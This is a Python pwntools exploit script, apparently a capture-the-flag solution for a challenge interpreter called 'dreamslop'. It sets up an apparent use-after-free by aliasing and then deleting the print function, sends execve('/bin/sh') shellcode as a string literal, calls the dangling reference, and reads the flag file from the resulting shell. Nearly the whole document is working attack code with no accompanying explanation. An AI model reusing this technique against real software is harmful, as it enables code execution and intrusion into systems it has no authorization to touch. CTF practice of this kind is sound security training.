#!/usr/bin/env python3
import os

from pwn import *

_ROOT = os.path.dirname(os.path.abspath(__file__))
exe = context.binary = ELF(os.path.join(_ROOT, "container", "interpreter", "dreamslop"), checksec=False)
context.arch = "amd64"
context.log_level = "info"
context.terminal = ["bash", "-lc"]

GDB_SCRIPT = """
set pagination off
handle SIGTRAP pass nostop noprint
continue
"""


def start():
    if args.REMOTE:
        host = args.HOST or "dreamslop.ctf.wales"
        port = int(args.PORT or 1337)
        io = remote(host, port)
    else:
        io = process([exe.path])
        if args.GDB:
            try:
                gdb.attach(io, gdbscript=GDB_SCRIPT)
                log.info("attached gdb to local process")
            except Exception as e:
                log.warning("gdb attach failed: %s", e)
    return io


def send_stmt(io, stmt: bytes):
    io.sendlineafter(b"db>  ", stmt)


def exploit(io):
    if args.GDB:
        sc = asm(shellcraft.write(1, b"GDB_HIT!", 8) + shellcraft.exit(0))
    else:
        sc = asm(shellcraft.execve("/bin/sh", 0, 0))
    bad = [b for b in (b"\n", b"\"", b"\\") if b in sc]
    if bad:
        log.failure("shellcode has bytes unsafe for string literal transport")
        return False

    send_stmt(io, b"var var p = print!")
    send_stmt(io, b"delete print!")
    io.sendlineafter(b"db>  ", b"\"" + sc + b"\"!")
    io.recvuntil(b"db>  ")
    io.sendline(b"p()!")

    if args.GDB:
        data = io.recvrepeat(1.0)
        if data:
            log.info("gdb-mode output:\n%s", data.decode("latin-1", errors="ignore"))
        return b"GDB_HIT!" in data

    # If shellcode worked, process is a shell now.
    io.sendline(b"id")
    io.sendline(b"cat /home/ctf/flag.txt || cat flag.txt")
    data = io.recvrepeat(1.0)
    if data:
        log.info("post-exploit output:\n%s", data.decode("latin-1", errors="ignore"))
    return b"{" in data or b"uid=" in data


def main():
    io = start()
    ok = exploit(io)
    if ok:
        log.success("exploit appears successful")
    else:
        log.failure("exploit failed")
    io.interactive()


if __name__ == "__main__":
    main()
